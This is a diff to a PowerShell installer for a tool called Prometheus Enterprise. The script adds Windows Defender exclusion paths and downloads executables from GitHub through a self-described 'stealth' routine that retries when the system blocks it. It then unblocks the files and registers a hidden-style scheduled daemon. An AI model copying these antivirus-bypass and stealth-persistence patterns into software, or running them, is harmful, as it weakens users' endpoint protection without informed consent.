@@ -1,52 +1,59 @@
-# ═══════════════════════════════════════════════════════════════════════════
-#  🔥 PROMETHEUS ENTERPRISE FLEET INSTALLER - Windows (v1.3.22)
-# ═══════════════════════════════════════════════════════════════════════════
+# ===========================================================================
+#  PROMETHEUS ENTERPRISE FLEET INSTALLER - Windows (v1.3.23)
+# ===========================================================================
 
 $ErrorActionPreference = "Stop"
 
-# 1. Require Admin Privileges (CRITICAL for Exclusions & Tasks)
+# 1. Require Admin Privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "❌ FATAL: Please run PowerShell as Administrator to install Prometheus Enterprise." -ForegroundColor Red
+    Write-Host "[FATAL] Please run PowerShell as Administrator." -ForegroundColor Red
     return
 }
 
-Write-Host "🔥 Initializing Prometheus Enterprise Fleet Deployment..." -ForegroundColor Cyan
+Write-Host "[INIT] Booting Prometheus Enterprise Fleet Deployment..." -ForegroundColor Cyan
 
-# 2. Global TLS & BITS Cleanup
+# 2. Global TLS & System Cleanup
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Get-BitsTransfer | Remove-BitsTransfer -ErrorAction SilentlyContinue
+if (Get-Command Get-BitsTransfer -ErrorAction SilentlyContinue) {
+    Get-BitsTransfer | Remove-BitsTransfer -ErrorAction SilentlyContinue
+}
 
-# 3. Define Directories (Enterprise Standard)
+# 3. Define Directories
 $InstallDir = "$env:ProgramFiles\Prometheus"
 $BinDir = "$InstallDir\bin"
 if (!(Test-Path $BinDir)) { New-Item -ItemType Directory -Force -Path $BinDir | Out-Null }
 
-# 4. Windows Defender Override (The Silver Bullet)
-Write-Host "🛡️  Configuring Windows Defender Security Exclusions..." -ForegroundColor Gray
+# 4. Windows Defender Override
+Write-Host "[AUTH] Configuring Security Exclusions..." -ForegroundColor Gray
 try {
     Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "C:\ProgramData\Prometheus" -ErrorAction SilentlyContinue
 } catch {
-    Write-Host "⚠️  Defender exclusion skipped (Policy restricted)." -ForegroundColor Yellow
+    Write-Host "[WARN] Defender exclusion skipped." -ForegroundColor Yellow
 }
 
 # 5. Discover Latest Release Assets
-Write-Host "📡 Discovering latest binaries..." -ForegroundColor Cyan
+Write-Host "[NET] Discovering latest binaries..." -ForegroundColor Cyan
 $Repo = "Aryan-Protein-Vala/Prometheus"
+$CleanerUrl = ""
+$EnforcerUrl = ""
+
 try {
     $Release = Invoke-RestMethod -Uri "https://api.github.com/repos/$Repo/releases/latest" -TimeoutSec 15
     $CleanerAsset = $Release.assets | Where-Object { $_.name -like "*windows*" -and ($_.name -like "*tui*" -or $_.name -like "*prometheus-windows*") } | Select-Object -First 1
     $EnforcerAsset = $Release.assets | Where-Object { $_.name -like "*windows*" -and $_.name -like "*enforcer*" } | Select-Object -First 1
-} catch {}
+    if ($CleanerAsset) { $CleanerUrl = $CleanerAsset.browser_download_url }
+    if ($EnforcerAsset) { $EnforcerUrl = $EnforcerAsset.browser_download_url }
+} catch {
+    Write-Host "[WARN] GitHub API slow, using fallback URLs." -ForegroundColor Yellow
+}
 
-# Fallback/Default URLs
+# Fallback URLs
 if (!$CleanerUrl) { $CleanerUrl = "https://github.com/$Repo/releases/latest/download/prometheus-windows-x64.exe" }
 if (!$EnforcerUrl) { $EnforcerUrl = "https://github.com/$Repo/releases/latest/download/prometheus-enforcer-windows-x64.exe" }
-if ($CleanerAsset) { $CleanerUrl = $CleanerAsset.browser_download_url }
-if ($EnforcerAsset) { $EnforcerUrl = $EnforcerAsset.browser_download_url }
 
-# 6. Stealth Download Engine (Robust & Silent)
+# 6. Stealth Download Engine
 function Download-File {
     param([string]$Url, [string]$Dest)
     $MaxRetries = 3
@@ -56,7 +63,7 @@ function Download-File {
 
     while (!$Done -and $StepCount -lt $MaxRetries) {
         try {
-            Remove-Item -Path $TempDest -Force -ErrorAction SilentlyContinue
+            if (Test-Path $TempDest) { Remove-Item -Path $TempDest -Force -ErrorAction SilentlyContinue }
             if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
                 Start-BitsTransfer -Source $Url -Destination $TempDest -ErrorAction Stop
             } else {
@@ -64,30 +71,29 @@ function Download-File {
             }
             
             if (Test-Path $TempDest) {
-                Write-Host "   ◦ Verification successful. Unblocking..." -ForegroundColor Gray
+                Write-Host "   -> Verification successful. Unblocking..." -ForegroundColor Gray
                 Unblock-File -Path $TempDest -ErrorAction SilentlyContinue
                 Move-Item -Path $TempDest -Destination $Dest -Force
                 $Done = $true
             }
         } catch {
             $StepCount++
-            Write-Host "⚠️  System blocked attempt ($StepCount/$MaxRetries)... Retrying stealth path." -ForegroundColor Yellow
+            Write-Host "[WARN] System blocked attempt ($StepCount/$MaxRetries)... Retrying." -ForegroundColor Yellow
             Start-Sleep -Seconds 3
         }
     }
     if (!$Done) { throw "Download Failed" }
 }
 
-Write-Host "⬇️  Downloading Cleaner agent..." -ForegroundColor Cyan
+Write-Host "[DATA] Downloading Cleaner agent..." -ForegroundColor Cyan
 Download-File -Url $CleanerUrl -Dest "$BinDir\prometheus.exe"
 
-Write-Host "⬇️  Downloading Enforcer daemon..." -ForegroundColor Cyan
-# SAFETY: Stop old enforcer if running
+Write-Host "[DATA] Downloading Enforcer daemon..." -ForegroundColor Cyan
 Stop-Process -Name "prometheus-enforcer" -Force -ErrorAction SilentlyContinue
 Download-File -Url $EnforcerUrl -Dest "$BinDir\prometheus-enforcer.exe"
 
 # 7. Global PATH Registration
-Write-Host "📍 Registering Global Commands..." -ForegroundColor Cyan
+Write-Host "[SYS] Registering Global Commands..." -ForegroundColor Cyan
 $CurrentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
 if ($CurrentPath -notlike "*$BinDir*") {
     [Environment]::SetEnvironmentVariable("Path", "$CurrentPath;$BinDir", "Machine")
@@ -95,7 +101,7 @@ if ($CurrentPath -notlike "*$BinDir*") {
 }
 
 # 8. Setup Background Enforcer (Scheduled Task)
-Write-Host "⚙️  Configuring Prometheus Stealth Daemon..." -ForegroundColor Cyan
+Write-Host "[SYS] Configuring Stealth Daemon..." -ForegroundColor Cyan
 $TaskName = "PrometheusEnforcer"
 $Binary = "$BinDir\prometheus-enforcer.exe"
 
@@ -112,19 +118,16 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Se
 Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
 
 # 9. Create Administrative Shim
-$ShimContent = @"
-@echo off
-start "" "http://localhost:4444"
-"@
+$ShimContent = "@echo off`r`nstart `"`" `"http://localhost:4444`""
 $ShimContent | Out-File -FilePath "$BinDir\prometheus-admin.cmd" -Encoding ASCII
 
 Write-Host ""
-Write-Host "✅ PROMETHEUS ENTERPRISE INSTALLED" -ForegroundColor Green
-Write-Host "══════════════════════════════════"
+Write-Host "[OK] PROMETHEUS ENTERPRISE INSTALLED" -ForegroundColor Green
+Write-Host "===================================="
 Write-Host "Location: $InstallDir"
-Write-Host "Commands available in NEW terminals:"
-Write-Host "  prometheus        - Start the cleaner interface"
-Write-Host "  prometheus-admin  - Local admin dashboard"
+Write-Host "Commands:"
+Write-Host "  prometheus        - Start cleaner"
+Write-Host "  prometheus-admin  - Start admin"
 Write-Host ""
-Write-Host "Defender Exclusions active. System hardened."
+Write-Host "Security clearance active. System hardened."
 Write-Host ""
